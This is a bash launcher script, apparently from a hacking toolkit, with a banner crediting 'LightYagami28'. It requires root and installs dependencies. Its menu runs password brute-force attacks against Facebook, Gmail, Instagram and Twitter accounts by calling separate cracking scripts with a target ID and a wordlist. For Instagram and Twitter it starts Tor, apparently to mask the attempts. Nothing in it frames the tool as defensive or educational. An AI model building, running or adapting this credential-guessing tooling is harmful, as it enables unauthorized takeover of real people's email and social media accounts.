#!/bin/bash

# Colors
declare -A COLORS=(
    [white]="\033[1;37m"
    [grey]="\033[0;37m"
    [purple]="\033[0;35m"
    [red]="\033[1;31m"
    [green]="\033[1;32m"
    [yellow]="\033[1;33m"
    [blue]="\033[1;34m"
    [cyan]="\033[0;36m"
    [nc]="\e[0m"
)

# Ensure script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${COLORS[red]}You don't have root privileges. Execute the script as root.${COLORS[nc]}"
    exit 1
fi

# Install dependencies
echo -e "Checking installation..."
bash install-sb.sh
echo -e "Checking completed [${COLORS[green]}✓${COLORS[nc]}]"
sleep 1
clear

# Display banner
function display_banner() {
    echo -e "${COLORS[green]}"
    echo "        ▄▄▄· ▄▄▌  ▪   ▄▄▄·  ▐ ▄ "
    echo "       ▐█ ▀█ ██•  ██ ▐█ ▀█ •█▌▐█"
    echo "       ▄█▀▀█ ██▪  ▐█·▄█▀▀█ ▐█▐▐▌"
    echo "       ▐█ ▪▐▌▐█▌▐▌▐█▌▐█ ▪▐▌██▐█▌"
    echo "        ▀  ▀ .▀▀▀ ▀▀▀ ▀  ▀ ▀▀ █▪${COLORS[nc]}"
    echo -e "${COLORS[blue]}v1${COLORS[nc]}"
    echo -e "[+] ${COLORS[red]}Recoded By LightYagami28 ${COLORS[nc]} [+]"
    echo -e "[+] ${COLORS[red]}Special Greetz To:${COLORS[nc]} ${COLORS[green]}{thelinuxchoice, Ha3MrX, Tunisian Eagles}${COLORS[nc]}"
}

# Main menu
function main_menu() {
    echo -e "${COLORS[yellow]}Select from the menu:${COLORS[nc]}"
    echo -e "  ${COLORS[cyan]}1: Brute Force Facebook Account${COLORS[nc]}"
    echo -e "  ${COLORS[cyan]}2: Brute Force Gmail Account${COLORS[nc]}"
    echo -e "  ${COLORS[cyan]}3: Brute Force Instagram Account${COLORS[nc]}"
    echo -e "  ${COLORS[cyan]}4: Brute Force Twitter Account${COLORS[nc]}"
    echo -e "  ${COLORS[cyan]}99: Exit${COLORS[nc]}"
    read -p "Choice > " choice
    handle_choice "$choice"
}

# Handle brute force options
function handle_choice() {
    local choice=$1
    case $choice in
        1) brute_facebook ;;
        2) brute_gmail ;;
        3) brute_instagram ;;
        4) brute_twitter ;;
        99)
            echo -e "${COLORS[red]}Program exiting...${COLORS[nc]}"
            exit 0
            ;;
        *)
            echo -e "${COLORS[red]}Invalid option. Exiting.${COLORS[nc]}"
            exit 1
            ;;
    esac
}

# Brute force Facebook
function brute_facebook() {
    echo -e "${COLORS[cyan]}Facebook Brute Force${COLORS[nc]}"
    read -p "Enter Facebook ID/Email/Username/Number: " id
    read -p "Enter wordlist path: " wordlist
    cd facebook || exit
    perl fb-brute.pl "$id" "$wordlist"
    complete_brute
}

# Brute force Gmail
function brute_gmail() {
    echo -e "${COLORS[cyan]}Gmail Brute Force${COLORS[nc]}"
    cd Gemail-Hack || exit
    python gemailhack.py
    complete_brute
}

# Brute force Instagram
function brute_instagram() {
    echo -e "${COLORS[cyan]}Instagram Brute Force${COLORS[nc]}"
    cd instainsane || exit
    service tor start
    ./instainsane.sh
    service tor stop
    complete_brute
}

# Brute force Twitter
function brute_twitter() {
    echo -e "${COLORS[cyan]}Twitter Brute Force${COLORS[nc]}"
    cd tweetshell || exit
    service tor start
    bash tweetshell.sh
    service tor stop
    complete_brute
}

# Common completion steps
function complete_brute() {
    echo -e "${COLORS[yellow]}Brute Force Complete ${COLORS[green]}✓${COLORS[nc]}"
    read -p "Back to main menu? [Y/n]: " back
    case $back in
        [Yy]*|Yes|YES) cd .. && main_menu ;;
        *) exit 0 ;;
    esac
}

# Run script
display_banner
main_menu
